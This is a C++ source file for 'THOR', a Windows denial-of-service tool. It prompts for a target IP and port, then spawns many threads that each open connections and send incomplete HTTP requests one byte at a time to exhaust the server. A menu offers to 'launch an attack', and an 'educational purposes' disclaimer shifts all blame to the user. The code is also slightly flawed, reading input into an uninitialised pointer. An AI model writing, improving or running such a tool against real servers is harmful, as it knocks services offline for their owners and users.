/***
***This tool is created by ABDULAZEEZ ABDULRAHMAN

*Author's Disclaimer: By using this tool, you agree to be held responsible for any
*harm/damage caused by you using the tool. We shall not be held responsible as the
*intent of the tool is for educational purposes and not destruction!!!
*You have been warned!!!

*Version 1.2 coming soon!
*Note that version 1.2 will be able to run on both Windows and Unix(OS).
*Enjoy usage!!
***/

#include <iostream>
#include <winsock2.h>
#include <cstring>
#include <string>

using namespace std;

#pragma comment(lib, "ws2_32.lib");
#define HOST sin_addr.S_un.S_addr

void PRO(){
    cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    cout << "++++++++    THOR   +++++++ Created by: AbdulRahman AbdulAzeez";
    cout << "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~V1.1\n\n";
    cout << "[!]Author's Disclaimer: By using this tool, you agree to be held responsible for any \n";
    cout << "[!]harm/damage caused by you using the tool. We shall not be held responsible as the \n";
    cout << "[!]intent of the tool is for educational purposes and not destruction!!! \n";
    cout << "[!]You have been warned!!!\n\n";
}

void note();

DWORD WINAPI thor(PVOID THOR){
    SOCKET sock;
    struct sockaddr_in *server;
    server= (sockaddr_in*)THOR;
while(1){
    sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        connect(sock,(struct sockaddr*)server, sizeof(sockaddr_in));

        char *IncompReqs="GET /";
        send(sock,IncompReqs,strlen(IncompReqs),0);
        char nons='N';
        while(1){
            int nonS=send(sock,&nons,1,0);
                if(nonS==SOCKET_ERROR){
                    break;
                }
            Sleep(50);
        }
closesocket(sock);
}
}

int main(){
    system("color 3");
    PRO();
    note();
    WSADATA wdata;
    struct sockaddr_in server;
    SOCKET sock;

    cout << " Welcome!!! Version 2 coming soon!!!\n\n";
    cout << "1. Launch an attack.\n";
    cout << "2. Exit.\n";

    cout << "\nSelect an option: ";
    string opt;
    cin >> opt;

    if(opt=="1"){
        system("cls");
        PRO();
        //ThorAWebsite();
    }
    else if(opt=="2"){
        exit(1);
    }

        if(WSAStartup(MAKEWORD(2,2),&wdata)!=0){
            cerr << "[!]Failed to initialize winsock!!! ERROR: ";
            cerr << WSAGetLastError() << endl;
            cout << "\n";
            system("pause");
            return 0;
        }


        char *target;
        cout << "[~]Enter the target's IP Address(*IP ADDRESS): ";
        cin >> target;
        server.sin_addr.s_addr=inet_addr(target);
        server.sin_family=AF_INET;
        int port;
        cout << "[~]Enter the port(enter 80 if you are not sure): ";
        cin >> port;
        server.sin_port=htons(port);


        cout << "[~]Number of requests you want to send: ";
        int InCom_req;
        cin >> InCom_req;

        int num;
        cout << endl;
        for(num=1; num<=InCom_req; num++){
            CreateThread(NULL,0,thor,&server,0,NULL);
            cout <<  "[*]Sending Incomplete requests.....to: ["
            << target << "]. Sent...[" << num << "] requests.\n";
        }

    cout << "\n[!]Do not close this in order to maintain the connection between this tool and\n";
    cout << "[!]and the target, but if you wish to terminate attack, then enter any key/close.";


closesocket(sock);
WSACleanup();
string closer;
cin >> closer;
return 0;
}

void note(){
    cout << "[+]Note: This is the first version of this program and for that reason, it will only run\n";
    cout << "[+]on windows. The next version will be able to run on both Windows and Unix based(OS)!\n";
    cout << "[+]Happy Usage!!!!\n\n\n";
}

